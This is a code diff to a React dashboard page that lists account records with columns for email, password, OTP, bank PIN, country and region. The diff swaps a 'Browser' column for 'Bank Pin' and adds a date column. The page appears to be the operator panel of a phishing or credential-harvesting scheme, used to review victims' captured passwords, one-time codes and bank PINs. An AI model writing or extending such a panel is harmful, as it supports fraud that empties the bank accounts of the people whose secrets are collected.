@@ -159,12 +159,12 @@ import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
 import { useDispatch, useSelector } from "react-redux";
 import { Trash2 } from "lucide-react";
 import { FaTrash } from "react-icons/fa";
+import moment from "moment";
 
 function CallLogsPage() {
   const dispatch = useDispatch();
   const user = useSelector((state: any) => state.auth.user);
   const accounts = useSelector((state: any) => state.dash.accounts);
-
   const [currentPage, setCurrentPage] = useState(1); // Pagination: current page
   const [totalAccounts, setTotalAccounts] = useState(0); // Total accounts count
   const [limit] = useState(10); // Number of entries per page (can be adjusted)
@@ -192,6 +192,9 @@ function CallLogsPage() {
       setSelectedAccounts([]); // Clear selected accounts
       fetchAccounts(currentPage); // Refresh after deletion
     };
+    // const filterAccounts = (accountsToDelete: any) => {
+    //   deleteAccounts({ id: accountsToDelete?._id }, dispatch);
+    // };
 
   // Handle page change
   const handlePageChange = (pageNumber: number) => {
@@ -239,7 +242,7 @@ function CallLogsPage() {
               <div title="Delete selected logs" className="hover:text-red-500">
               <Button
                   className="btn-md bg-[#546dfe]"
-                  onClick={handleDeleteSelectedAccounts}
+                  onClick={()=>{handleDeleteSelectedAccounts()}}
                   disabled={selectedAccounts.length === 0}
                   hidden={selectedAccounts.length === 0}
                 >
@@ -266,9 +269,10 @@ function CallLogsPage() {
                       <th>Email</th>
                       <th>Password</th>
                       <th>Otp</th>
-                      <th>Browser</th>
+                      <th>Bank Pin</th>
                       <th>Country Flag</th>
                       <th>State</th>
+                      <th>Date</th>
                       <th>Action</th>
                     </tr>
                   </thead>
@@ -302,7 +306,7 @@ function CallLogsPage() {
                           </td>
                           <td>
                             <span className="fw-semibold fs-13">
-                              {"browser info"}
+                              {account.bankPin}
                             </span>
                             <span className="d-block text-muted fs-12">
                               {/* {account?.location?.country} */}
@@ -318,6 +322,11 @@ function CallLogsPage() {
                             />
                           </td>
                           <td>{account?.location?.region}</td>
+                          <td>
+                            <div className="btn-list">
+                              {moment(account.createdAt).format('ddd, MMM DD,YYYY')}
+                            </div>
+                          </td>
                           <td>
                             <div className="btn-list">
                               <Button
